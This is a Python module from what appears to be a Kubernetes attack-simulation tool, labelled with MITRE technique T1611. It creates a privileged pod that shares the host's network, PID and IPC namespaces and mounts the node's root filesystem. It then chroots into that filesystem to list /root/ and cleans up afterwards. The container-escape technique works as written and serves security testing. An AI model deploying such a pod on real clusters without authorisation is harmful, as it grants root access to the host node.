from testing.testing import Testing
import time

class DisableNamespacing(Testing):
    def __init__(self):
        super().__init__()
        self.name = "Disable Namespacing"
        self.mitre_tactic = "TA0004"
        self.mitre_technique = "T1611"
        self.microsoft_technique = None
        self.pod = """apiVersion: v1
kind: Pod
metadata:
  name: disable-namespacing
  labels:
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: disable-namespacing
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
"""
        self.commands = [
                "ls -al /root/",             
                "exit"          
            ]
    def run_attack(self):
        if self.check_install_kubectl():   
            
                # Creating Pod disable-namespacing
                print("# Creating Pod disable-namespacing...")
                self.create_file("disable-namespacing.yaml", self.pod)
                self.kubectl_apply("disable-namespacing.yaml")
            
                while not self.kubectl_is_pod_ready("disable-namespacing"):
                    time.sleep(1)
                
                # Exec into Container with bash
                self.cmd = ["kubectl", "exec", "-it", "disable-namespacing", "--", "chroot", "/host", "sh", "-c", self.commands[0]]
                print("\n# Exec into Container with bash...")
                output, error = self.kubectl_exec_command()
                print("chroot@near-dev:/# ls -al /root/")
                print(output)

                # Exec into Container with bash
                self.cmd = ["kubectl", "exec", "-it", "disable-namespacing","--","/bin/bash", "-c", self.commands[0]]
                print("\n# Exec into Container with bash...")
                output, error = self.kubectl_exec_command()
                print("root@near-dev:/# ls -al /root/")
                print(output)


                if self.error:
                    print("An Error has occured: " + error)
                else:
                    self.output["hostname"] = output
                # Cleanup
                self.cleanup()

    def cleanup(self):
        # Delete Pod disable-namespacing
        print("# Deleting Pod disable-namespacing...")
        self.kubectl_delete("disable-namespacing")
        
        print("\n# Deleting disable-namespacing.yaml...")
        self.delete_file("disable-namespacing.yaml")


    def display_help(self):
        pass

    def check_prerequisites(self):
        pass

    def determine_executable_path(self):
        pass